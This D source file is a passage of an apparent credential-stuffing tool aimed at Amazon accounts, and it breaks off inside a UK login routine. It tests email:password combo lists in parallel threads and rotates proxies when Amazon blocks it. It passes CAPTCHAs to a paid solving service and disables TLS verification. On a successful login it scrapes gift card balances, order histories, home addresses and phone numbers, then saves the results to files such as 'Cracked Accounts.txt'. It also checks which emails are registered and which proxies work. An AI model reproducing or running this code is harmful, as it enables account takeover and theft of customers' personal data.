module main;

import core.time;
import etc.c.curl : CurlOption, CurlInfo;
import gtk.Button;
import gtk.Entry;
import gtk.FileChooserDialog;
import gtk.Label;
import gtk.Main;
import gtk.MainWindow;
import gtk.SpinButton;
import gtk.VBox;
import std.array;
import std.conv;
import std.digest.md;
import std.exception;
import std.file;
import std.json;
import std.net.curl;
import std.parallelism;
import std.random;
import std.regex;
import std.encoding;
import std.stdio;
import std.string;
import std.uuid;
import core.sys.windows.windows;
import core.stdc.string;

string runCaptcha(string img, string duser, string dpass)
{
	writeln("Running Captcha Check!");
	string text;
	string bound = "---------------------------723690991551375881941829999";
	auto conn = HTTP("http://api.dbcapi.me/api/captcha");
	conn.handle.set(CurlOption.followlocation, false);
	conn.handle.set(CurlOption.ssl_verifypeer, false);
	conn.addRequestHeader("Content-Type", "multipart/form-data; boundary=" ~ bound ~ "; charset=UTF-8");
	conn.addRequestHeader("Accept", "application/json; charset=utf-8");
	string postData = "--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n" ~ to!string(duser) ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n" ~ to!string(dpass) ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"captchafile\";\r\nContent-Type: application/octet-stream\r\n\r\n" ~ to!string(img) ~ "\r\n--" ~ bound ~ "--\r\n";
	conn.postData = postData;
	conn.perform();
	string url = conn.responseHeaders["location"];
	bool solved = false;
	while(!solved)
	{
		ubyte[] result;
		auto conn1 = HTTP(url);
		conn1.handle.set(CurlOption.ssl_verifypeer, false);
		conn1.addRequestHeader("Accept", "application/json; charset=utf-8");
		conn1.onReceive = (ubyte[] data)
		{
			result ~= data;
			return data.length;
		};
		conn1.perform();
		char* cstr = cast(char*) result;
		string str = cast(string) cstr[0..strlen(cstr)];
		
		auto js = parseJSON(str);
		if (!chomp(js["text"].str).empty)
		{
			text = js["text"].str;
			writeln("Found Captcha Text: " ~ text);
			solved = true;
		}
		else
		{
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
	return text;
}

void run(string user, string pass, string duser, string dpass)
{
	while (true) {
		try
		{
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			char[][] orders;
			string gcb;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			conn.operationTimeout(dur!"seconds"(10));
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.0 Safari/537.36");
			auto html = get("https://source.amazon.com/ap/signin?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&marketPlaceId=A1V2SYLTMPP362&openid.assoc_handle=kor_b2bportal_na&openid.return_to=https%3A%2F%2Fsource.amazon.com%2F%23%2Fdashboard&&openid.pape.max_auth_age=0", conn);
			
			auto appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
			auto prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
			string postData = "appActionToken=" ~ to!string(appActionToken) ~ "&prevRID=" ~ to!string(prevRID) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&appAction=SIGNIN&marketPlaceId=ape:QTFWMlNZTFRNUFAzNjI=&openid.assoc_handle=ape:a29yX2IyYnBvcnRhbF9uYQ==&openid.claimed_id=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.identity=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.mode=ape:Y2hlY2tpZF9zZXR1cA==&openid.ns=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=&openid.pape.max_auth_age=ape:MA==&openid.return_to=ape:aHR0cHM6Ly9zb3VyY2UuYW1hem9uLmNvbS8jL2Rhc2hib2FyZA==&pageId=ape:a29yX2IyYnBvcnRhbF9uYQ==&create=0";
			html = post("https://source.amazon.com/ap/signin", postData.replace(":", "%3A"), conn);
			if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
			{
				if (duser != null) {
					bool captcha = true;
					while (captcha)
					{
						writeln("Account Has Captcha! " ~ user);
						
						auto captcha1 = match(html, regex("<div id=\"ap_captcha_img\">\n    <img src=\"(.*?)\" />")).captures[1];
						if (!captcha1.empty)
						{
							if (captcha1.indexOf("data:image/jpeg;base64") != -1)
							{
								auto decoded = to!string(captcha1).replace("data:image/jpeg;base64,", "base64:");
								captchatext = runCaptcha(decoded, duser, dpass);
							}
							else if (captcha1.indexOf("https://") != -1)
							{
								auto captchas = get(chomp(to!string(captcha1)), conn);
								captchatext = runCaptcha(to!string(captchas), duser, dpass);
							}
						}
						
						auto captcha2 = match(html, regex("<img alt=\"\" src=\"(.*?)\" data-refresh-url")).captures[1];
						if (!captcha2.empty)
						{
							if (captcha2.indexOf("data:image/jpeg;base64") != -1)
							{
								captchatext = runCaptcha(to!string(captcha2).replace("data:image/jpeg;base64,", "base64:"), duser, dpass);
							}
							else if (captcha2.indexOf("https://") != -1)
							{
								captchatext = runCaptcha(to!string(get(chomp(to!string(captcha2)), conn)), duser, dpass);
							}
						}
						appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
						prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
						auto ces = match(html, regex("ces\" value=\"(.*?)\"")).captures[1];
						postData = "appActionToken=" ~ chomp(to!string(appActionToken)) ~ "&prevRID=" ~ chomp(to!string(prevRID)) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&ces=" ~ chomp(to!string(ces)) ~ "&guess=" ~ captchatext ~ "&forceValidateCaptcha=ape:dHJ1ZQ==&appAction=SIGNIN&marketPlaceId=ape:QTFWMlNZTFRNUFAzNjI=&openid.assoc_handle=ape:a29yX2IyYnBvcnRhbF9uYQ==&openid.claimed_id=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.identity=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.mode=ape:Y2hlY2tpZF9zZXR1cA==&openid.ns=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=&openid.pape.max_auth_age=ape:MA==&openid.return_to=ape:aHR0cHM6Ly9zb3VyY2UuYW1hem9uLmNvbS8jL2Rhc2hib2FyZA==&pageId=ape:a29yX2IyYnBvcnRhbF9uYQ==&create=0";
						html = post("https://source.amazon.com/ap/signin", postData.replace(":", "%3A"), conn);
						if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
						{
							writeln("Account Still Has Captcha! " ~ user);
							captcha = true;
						} 
						else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1 || html.indexOf("E-mail Address Already in Use ") != -1) 
						{
							writeln("Account Does Not Work! " ~ user);
							std.file.append("./Non-Working Accounts.txt", user ~ ":" ~ pass ~ "\r\n");
							return;
						}
						else if (html.indexOf("<title>Your Orders</title>") != -1)
						{
							writeln("Account Works! " ~ user);
							working = true;
						}
						else if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
						{
							writeln("IP Banned!");
							return;
						}
					}
				}
			}
			else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			else if (html.indexOf("Server Busy") != -1)
			{
				writeln("IP Banned!");
				return;
			}
			else if (html.indexOf("<title>Amazon Source</title>") != -1)
			{
				writeln("Account Works! " ~ user);
				working = true;
			}
			
			if (working)
			{
				conn.handle.set(CurlOption.cainfo, getcwd() ~ "/amazon.pem");
				html = get("https://www.amazon.com/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc&", conn);
				auto gcbm = match(html, regex("Your Gift Card Balance:.*?>(.*?)</span>", "s"));
				gcb = to!string(gcbm.captures[1]);
				
				int years = 2014;
				int yearsend = 2015;
				while (years <= yearsend)
				{
					bool pages = true;
					int page = 1;
					while (pages)
					{
						html = get("https://www.amazon.com/gp/css/order-history?opt=ab&digitalOrders=1&unifiedOrders=1&returnTo=&orderFilter=year-" ~ to!string(years) ~ "&startIndex=" ~ to!string((page - 1) * 10), conn);
						auto matches = matchAll(html, regex("<a class=\"a-link-normal\" href=\"/gp/product/.*?>(.*?)</a>", "s"));
						auto check = matchAll(html, regex("0 order placed in", "s"));
						if (!matches.empty)
						{
							pages = false;
						}
						foreach (c; matches)
						{
							if (c.hit.indexOf("<img") == -1)
							{
								auto ordersre = regex("        (.*?)\n", "s");
								auto ordersm = match(c.hit, ordersre);
								auto ordersa = ordersm.captures[1];
								if (ordersa.indexOf("View orders in") == -1) {
									orders ~= chomp(ordersa);
								}
							}
						}
						page += 1;
					}
					years += 1;
				}
				html = get("https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8&ref_=ya_manage_address_book_t1", conn);
				
				auto addressre = regex("displayAddressLI displayAddressAddressLine1\">(.*?)</li>", "s");
				auto addressm = matchAll(html, addressre);
				string[] addresses;
				foreach (c; addressm)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					addresses ~= chomp(to!string(item));
				}
				
				auto cityre = regex("displayAddressLI displayAddressCityStateOrRegionPostalCode\">(.*?)</li>", "s");
				auto citym = matchAll(html, cityre);
				string[] citys;
				foreach (c; citym)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					citys ~= chomp(to!string(item));
				}
				
				auto countryre = regex("displayAddressLI displayAddressCountryName\">(.*?)</li>", "s");
				auto countrym = matchAll(html, countryre);
				string[] countrys;
				foreach (c; countrym)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					countrys ~= chomp(to!string(item));
				}
				
				auto phonere = regex("displayAddressLI displayAddressPhoneNumber\">(.*?)</li>", "s");
				auto phonem = matchAll(html, phonere);
				string[] phones;
				foreach (c; phonem)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					phones ~= chomp(to!string(item));
				}

				if (orders.length > 0)
				{
					string content = "====================================\r\nAccount: " ~ user ~ ":" ~ pass ~ "\r\n";
					content ~= "Gift Card Balance: " ~ gcb ~ "\r\n";
					
					content ~= "Addresses: \r\n";
					foreach (address; addresses)
					{
						content ~= ("    " ~ address ~ "\r\n");
					}
					
					content ~= "City, State ZIP: \r\n";
					foreach (city; citys)
					{
						content ~= ("    " ~ city ~ "\r\n");
					}
					
					content ~= "Country: \r\n";
					foreach (country; countrys)
					{
						content ~= ("    " ~ country ~ "\r\n");
					}
					
					content ~= "Phone: \r\n";
					foreach (phone; phones)
					{
						content ~= ("    " ~ phone ~ "\r\n");
					}
					
					content ~= "Orders: \r\n";
					foreach (order; orders)
					{
						content ~= ("    " ~ order ~ "\r\n");
					}
					content ~= "====================================\r\n\r\n";
					writeln("Account has " ~ to!string(orders.length) ~ " orders and " ~ gcb ~ " Gift Card Balance");
					std.file.append("./US Working.txt", content);
				}
				delete html;
				conn.clearAllCookies();
				return;
			}
		} catch (Exception e) {
			writeln(e.msg);
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
}

void startRun(string file, int threads, string duser = null, string dpass = null)
{
	auto accounts = readText(file).splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1)
		{
			auto arr = split(account, ":");
			run(to!string(chomp(arr[0])), to!string(chomp(arr[1])), duser, dpass);
		}
	}
}

void crack(string user, string pass, string proxy, string proxyfile, string duser = null, string dpass = null)
{
	int trys = 0;
	while (true) {
		try
		{
			if (trys >= 5 && proxy != null) {
				auto plines = readText(proxyfile).splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
				trys = 0;
			}
			writeln("Begin Checking Account! " ~ user);
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			conn.handle.set(CurlOption.proxy, proxy);
			conn.operationTimeout(dur!"seconds"(25));
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36");
			conn.addRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
			conn.addRequestHeader("Accept-Language", "en-US,en;q=0.8");

			auto html = get("https://www.amazon.co.uk/ap/signin?_encoding=UTF8&accountStatusPolicy=P1&openid.assoc_handle=gbflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.uk%2Fgp%2Fcss%2Forder-history%3Fie%3DUTF8%26ref_%3Dnav_gno_yam_yrdrs&pageId=webcs-yourorder&showRmrMe=1", conn);
			
			if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
			{
				writeln("Proxy Banned!" ~ proxy);
				auto plines = readText(proxyfile).splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
			}
			
			auto appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
			auto prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
			auto url = to!string(match(html, regex("novalidate=\"novalidate\" action=\"(.*?)\"")).captures[1]);
			if (url.empty) {
				url = "https://www.amazon.co.uk/ap/signin";
			}

			string postData = "appActionToken=" ~ chomp(to!string(appActionToken)) ~ "&prevRID=" ~ chomp(to!string(prevRID)) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&appAction=SIGNIN&create=0&accountStatusPolicy=ape:UDE=&openid.assoc_handle=ape:Z2JmbGV4&openid.claimed_id=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.identity=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.mode=ape:Y2hlY2tpZF9zZXR1cA==&openid.ns.pape=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA==&openid.ns=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=&openid.pape.max_auth_age=ape:MA==&openid.return_to=ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLnVrL2dwL2Nzcy9vcmRlci1oaXN0b3J5P2llPVVURjgmcmVmXz1uYXZfZ25vX3lhbV95cmRycw==&pageId=ape:d2ViY3MteW91cm9yZGVy&showRmrMe=ape:MQ==";
			html = post(url, postData.replace(":", "%3A"), conn);
			if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
			{
				if (duser != null) {
					bool captcha = true;
					while (captcha)
					{
						writeln("Account Has Captcha! " ~ user);
						
						auto captcha1 = match(html, regex("<div id=\"ap_captcha_img\">\n    <img src=\"(.*?)\" />")).captures[1];
						if (!captcha1.empty)
						{
							if (captcha1.indexOf("data:image/jpeg;base64") != -1)
							{
								auto decoded = to!string(captcha1).replace("data:image/jpeg;base64,", "base64:");
								captchatext = runCaptcha(decoded, duser, dpass);
							}
							else if (captcha1.indexOf("https://") != -1)
							{
								auto captchas = get(chomp(to!string(captcha1)), conn);
								captchatext = runCaptcha(to!string(captchas), duser, dpass);
							}
						}
						
						auto captcha2 = match(html, regex("<img alt=\"\" src=\"(.*?)\" data-refresh-url")).captures[1];
						if (!captcha2.empty)
						{
							if (captcha2.indexOf("data:image/jpeg;base64") != -1)
							{
								captchatext = runCaptcha(to!string(captcha2).replace("data:image/jpeg;base64,", "base64:"), duser, dpass);
							}
							else if (captcha2.indexOf("https://") != -1)
							{
								captchatext = runCaptcha(to!string(get(chomp(to!string(captcha2)), conn)), duser, dpass);
							}
						}
						appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
						prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
						auto ces = match(html, regex("ces\" value=\"(.*?)\"")).captures[1];
						postData = "appActionToken=" ~ chomp(to!string(appActionToken)) ~ "&prevRID=" ~ chomp(to!string(prevRID)) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&ces=" ~ chomp(to!string(ces)) ~ "&guess=" ~ captchatext ~ "&forceValidateCaptcha=ape:dHJ1ZQ==&appAction=SIGNIN&create=0&accountStatusPolicy=ape:UDE=&openid.assoc_handle=ape:Z2JmbGV4&openid.claimed_id=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.identity=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.mode=ape:Y2hlY2tpZF9zZXR1cA==&openid.ns.pape=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA==&openid.ns=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=&openid.pape.max_auth_age=ape:MA==&openid.return_to=ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLnVrL2dwL2Nzcy9vcmRlci1oaXN0b3J5P2llPVVURjgmcmVmXz1uYXZfZ25vX3lhbV95cmRycw==&pageId=ape:d2ViY3MteW91cm9yZGVy&showRmrMe=ape:MQ==";
						html = post("https://www.amazon.co.uk/ap/signin", postData.replace(":", "%3A"), conn);
						if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
						{
							writeln("Account Still Has Captcha! " ~ user);
							captcha = true;
							auto plines = readText(proxyfile).splitLines();
							proxy = chomp(plines[uniform(0, plines.length - 1)]);
						} 
						else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1 || html.indexOf("E-mail Address Already in Use ") != -1) 
						{
							writeln("Account Does Not Work! " ~ user);
							std.file.append("./Non-Working Accounts.txt", user ~ ":" ~ pass ~ "\r\n");
							return;
						}
						else if (html.indexOf("<title>Your Orders</title>") != -1)
						{
							writeln("Account Works! " ~ user);
							std.file.append("./Cracked Accounts.txt", user ~ ":" ~ pass ~ "\r\n");
							core.thread.Thread.sleep(dur!("seconds")(1));
						}
						else if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
						{
							writeln("Proxy Banned!" ~ proxy);
							auto plines = readText(proxyfile).splitLines();
							proxy = chomp(plines[uniform(0, plines.length - 1)]);
						}
					}
				} else if (proxy != null) {
					writeln("Proxy Has Captcha! " ~ proxy);
					auto plines = readText(proxyfile).splitLines();
					proxy = chomp(plines[uniform(0, plines.length - 1)]);
				}
			} else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1 || html.indexOf("E-mail Address Already in Use ") != -1) {
				writeln("Account Does Not Work! " ~ user);
				std.file.append("./Non-Working Accounts.txt", user ~ ":" ~ pass ~ "\r\n");
				return;
			}
			else if (html.indexOf("<title>Your Orders</title>") != -1)
			{
				writeln("Account Works! " ~ user);
				std.file.append("./Cracked Accounts.txt", user ~ ":" ~ pass ~ "\r\n");
				core.thread.Thread.sleep(dur!("seconds")(1));
			}
			else if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
			{
				writeln("Proxy Banned! " ~ proxy);
				auto plines = readText(proxyfile).splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
			}
			
			delete html;
			conn.clearAllCookies();
			
		} catch (Exception) {
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
		trys += 1;
	}
}

void startCrack(string combofile, string proxyfile, int threads, string duser = null, string dpass = null)
{
	auto accounts = readText(combofile).splitLines();
	auto work = new TaskPool(threads);
	auto proxies = readText(proxyfile).splitLines();
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1)
		{
			auto arr = split(account, ":");
			auto proxy = chomp(proxies[uniform(0, proxies.length - 1)]);
			crack(to!string(chomp(arr[0])), (to!string(chomp(arr[1]))), proxy, proxyfile, duser, dpass);
		}
	}
}

void reg(string user, string pass)
{
	bool work = true;
	while (work)
	{
		try {
			writeln("Checking Account: " ~ user);
			
			auto conn = HTTP();
			conn.handle.set(CurlOption.followlocation, false);
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			auto html = get("https://www.amazon.com/ap/register?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dgno_newcust?&email=" ~ user, conn);
			
			if (html.indexOf("You indicated you are a new customer") != -1) {
				writeln("Account is Registered on Amazon: " ~ user);
				std.file.append("Registered Accounts.txt", user ~ ":" ~ pass ~ "\r\n");
			} else if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
			{
				writeln("IP Banned! Change IP To Fix!");
				work = true;
				return;
			}
			delete html;
			work = false;
		}
		catch (Exception)
		{
			work = true;
		}
	}
	return;
}

void startReg(string combofile, int threads)
{
	auto accounts = readText(combofile).splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1)
		{
			auto arr = split(account, ":");
			reg(to!string(chomp(arr[0])), to!string(chomp(arr[1])));
		}
	}
}

void proxies(string proxy)
{
	bool working = true;
	try
	{
		auto conn = HTTP();
		conn.handle.set(CurlOption.ssl_verifypeer, false);
		conn.operationTimeout(dur!"seconds"(25));
		conn.handle.set(CurlOption.proxy, proxy);
		auto rand = uniform(99999999999999, 99999999999999999);
		conn.setCookieJar(tempDir() ~ to!string(rand));
		conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36");
		
		auto html = get("https://www.amazon.com/ap/signin?_encoding=UTF8&ie=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Forder-history%3Fie%3DUTF8%26ref_%3Dya_orders_ap&pageId=webcs-yourorder&showRmrMe=1", conn);
		if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
		{
			writeln("Proxy Does Not Works! " ~ proxy);
			working = false;
			return;
		}
		
	}
	catch (Exception e)
	{
		writeln("Proxy Does Not Works! " ~ proxy);
		working = false;
	}
	
	if (working)
	{
		writeln("Proxy Works!" ~ proxy);
		std.file.append("./Proxies Working.txt", proxy ~ "\r\n");
	}
}

void startProxy(string proxyfile, int threads)
{
	auto proxys = readText(proxyfile).splitLines();
	auto work = new TaskPool(threads);
	foreach (proxy; work.parallel(proxys))
	{
		if(proxy.indexOf(":") != -1)
		{
			proxies(to!string(chomp(proxy)));
		}
	}
}

void runUK(string user, string pass, int save, string duser = null, string dpass = null)
{
	bool done = false;
	bool working = false;
	int trys = 0;
	while (!done) {
		try
		{
			writeln("Begin Checking Account! " ~ user);
			string captchatext;
			char[][] orders;
			string gcb;
			auto rand = uniform(99999999999999, 99999999999999999);
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			conn.handle.set(CurlOption.proxy, "");
			conn.operationTimeout(dur!"seconds"(25));
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36");
			conn.addRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
			conn.addRequestHeader("Accept-Language", "en-US,en;q=0.8");
			conn.addRequestHeader("Origin", "https://www.amazon.co.uk");
			auto html = get("https://www.amazon.co.uk/ap/signin?_encoding=UTF8&accountStatusPolicy=P1&openid.assoc_handle=gbflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.uk%2Fgp%2Fcss%2Forder-history%3Fie%3DUTF8%26ref_%3Dnav_gno_yam_yrdrs&pageId=webcs-yourorder&showRmrMe=1", conn);
			
			if (html.indexOf("Sorry, we just need to make sure you're not a robot.") != -1)
			{
				writeln("BANNED! CHANGE YOUR IP TO FIX IT");
				done = true;
				return;
			}

			auto appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
			auto prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
			string postData = "appActionToken=" ~ chomp(to!string(appActionToken)) ~ "&prevRID=" ~ chomp(to!string(prevRID)) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&appAction=SIGNIN&create=0&accountStatusPolicy=ape:UDE=&openid.assoc_handle=ape:Z2JmbGV4&openid.claimed_id=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.identity=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.mode=ape:Y2hlY2tpZF9zZXR1cA==&openid.ns.pape=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA==&openid.ns=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=&openid.pape.max_auth_age=ape:MA==&openid.return_to=ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLnVrL2dwL2Nzcy9vcmRlci1oaXN0b3J5P2llPVVURjgmcmVmXz1uYXZfZ25vX3lhbV95cmRycw==&pageId=ape:d2ViY3MteW91cm9yZGVy&showRmrMe=ape:MQ==";
			
			conn.addRequestHeader("Referer", "https://www.amazon.co.uk/ap/signin?_encoding=UTF8&accountStatusPolicy=P1&openid.assoc_handle=gbflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.uk%2Fgp%2Fcss%2Forder-history%3Fie%3DUTF8%26ref_%3Dnav_gno_yam_yrdrs&pageId=webcs-yourorder&showRmrMe=1");
			html = post("https://www.amazon.co.uk/ap/signin", postData.replace(":", "%3A"), conn);
			if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
			{
				if (duser != null) {
					bool captcha = true;
					while (captcha)
					{
						writeln("Account Has Captcha! " ~ user);
						
						auto captcha1 = match(html, regex("<div id=\"ap_captcha_img\">\n    <img src=\"(.*?)\" />")).captures[1];
						if (!captcha1.empty)
						{
							if (captcha1.indexOf("data:image/jpeg;base64") != -1)
							{
								auto decoded = to!string(captcha1).replace("data:image/jpeg;base64,", "base64:");
								captchatext = runCaptcha(decoded, duser, dpass);
							}
							else if (captcha1.indexOf("https://") != -1)
							{
								auto captchas = get(chomp(to!string(captcha1)), conn);
